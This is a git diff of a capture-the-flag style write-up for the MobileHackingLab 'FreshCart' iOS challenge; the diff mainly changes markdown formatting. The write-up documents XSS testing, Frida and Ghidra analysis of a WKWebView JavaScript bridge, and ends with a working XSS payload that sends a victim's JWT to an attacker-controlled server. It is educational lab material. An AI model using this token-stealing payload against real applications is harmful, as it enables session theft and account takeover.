@@ -1,7 +1,4 @@
-Title: MobileHackingLab - FreshCart
-Slug: mobile/mobilehackinglab/fresh-cart
-Date: 2025-09-25 18:00
-Category: Mobile
+# MobileHackingLab - FreshCart
 
 This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-freshcart).
 
@@ -12,69 +9,69 @@ Freshcart contains a critical vulnerability that allows token stealing by exploi
 
 The app presents itself as follows:
 
-![[fresh-cart-app-2.jpg]]
+![fresh-cart-app-2](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-2.jpg)
 
 First step has been to register:
 
-![[fresh-cart-app-3.jpg]]
+![fresh-cart-app-3](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-3.jpg)
 
 The following product overview is then shown:
 
-![[fresh-cart-app-1.jpg]]
+![fresh-cart-app-1](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-1.jpg)
 
 Entering the detail of a product, it's possible to write a review:
 
-![[fresh-cart-app-4.jpg]]
+![fresh-cart-app-4](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-4.jpg)
 
 Testing the following payload in the "Review Content" field produces no results:
 
-~~~
+```
 <script>alert(1)</script>
-~~~
+```
 
-![[fresh-cart-app-5.jpg]]
+![fresh-cart-app-5](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-5.jpg)
 
 However, the following payload shows that html is actually interpreted and therefore XSS attacks may be possible:
 
-~~~
+```
 <img src=x>
-~~~
+```
 
-![[fresh-cart-app-6.jpg]]
+![fresh-cart-app-6](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-6.jpg)
 
 ### Static Analysis
 
 Dump swift classes with `ipsw`:
-~~~shell
+```shell
 ipsw swift-dump --demangle Payload/FreshCart.app/FreshCart > classes.swift
-~~~
+```
 
-![[fresh-cart-decompiled-1.png]]
+![fresh-cart-decompiled-1](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-decompiled-1.png)
 
 
 The class `FreshCart.WebViewController` indicates that WebViews are being used; the following command is used to determine which WebView library is used:
 
-~~~shell
+```shell
 strings Payload/FreshCart.app/FreshCart | grep -Ei "UIWebView|WKWebView|SFSafariViewController" 
-~~~
+```
 
-![[fresh-cart-webview-enumeration.png]]
+![fresh-cart-webview-enumeration](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-webview-enumeration.png)
 
 `WKWebView` is being used.
 ### Dynamic Analysis
 
 Trace all `FreshCart.WebViewController` methods with `frida-trace`:
 
-~~~
+```
 frida-trace -U -m "*[FreshCart.WebViewController *]" -n 'FreshCart' 
-~~~
+```
 
 
-![[fresh-cart-frida-trace.png]]
+![fresh-cart-frida-trace](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-frida-trace.png)
 
 The method `userContentController` is constantly invoked throughout the whole application. Following the method's code decompiled with `ghidra`:
 
-~~~c
+```c
 
 /* FreshCart.WebViewController.userContentController(_: __C.WKUserContentController, didReceive:
    __C.WKScriptMessage) -> () */
@@ -336,30 +333,30 @@ FreshCart::WebViewController::userContentController
   }
   return;
 }
-~~~
+```
 
 The function `evaluateJavaScript:completionHandler` function is invoked from various branches in this code. This suggests that `WKWebView`'s native Javascript bridge is being used.
 
 - A post message containing the current user JWT token is sent whenever the method `userContentController` is invoked. 
 
-![[fresh-cart-decompiled-2.png]]
+![fresh-cart-decompiled-2](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-decompiled-2.png)
 
 By using `frida`, a script for intercepting `evaluateJavaScript:completionHandler` and dumping its arguments has been written. This is necessary to understand whether this function is actually used within the XSS-vulnerable functionality. 
 
 First, enumerate the method signature:
 
-~~~
+```
 frida -U -n 'FreshCart' 
 ...
 > ObjC.classes['WKWebView'].$ownMethods.filter(x=>x.includes('evaluate'))
-~~~
+```
 
 
-![[fresh-cart-frida-1.png]]
+![fresh-cart-frida-1](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-frida-1.png)
 
 Following the complete script:
 
-~~~javascript
+```javascript
 Interceptor.attach(ObjC.classes['WKWebView']['- evaluateJavaScript:completionHandler:'].implementation,{
     onEnter: function(args){
         console.log('[!] Entered evaluateJavaScript function...');
@@ -369,17 +366,17 @@ Interceptor.attach(ObjC.classes['WKWebView']['- evaluateJavaScript:completionHan
         // do nothing
     }
 });
-~~~
+```
 
-![[fresh-cart-frida-script.png]]
+![fresh-cart-frida-script](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-frida-script.png)
 
 Load the script:
 
-~~~
+```
 > %load hook.js
-~~~
+```
 
-![[fresh-cart-frida-2.png]]
+![fresh-cart-frida-2](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-frida-2.png)
 
 Interacting with the application confirmed that the vulnerable function is executed (also) on the product detail view which is apparently vulnerable to Cross-Site Scripting.
 
@@ -387,17 +384,17 @@ Interacting with the application confirmed that the vulnerable function is execu
 
 By providing the following payload, the post message will be intercepted, base64-encoded and sent to an attacker-controller server:
 
-~~~
+```
 <img src=x onerror='window.addEventListener("message", (event) => {fetch("http://192.168.10.222:8000?data=" + btoa(JSON.stringify(event.data)))});' />
-~~~
+```
 
 
-![[fresh-cart-app-7.jpg]]
+![fresh-cart-app-7](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-app-7.jpg)
 
 
 The exfiltrated data is the decoded and the victim JWT obtained:
 
-![[fresh-cart-solution.png]]
+![fresh-cart-solution](../../images/mobile/mobilehackinglab/freshcart/fresh-cart-solution.png)
 
 
 
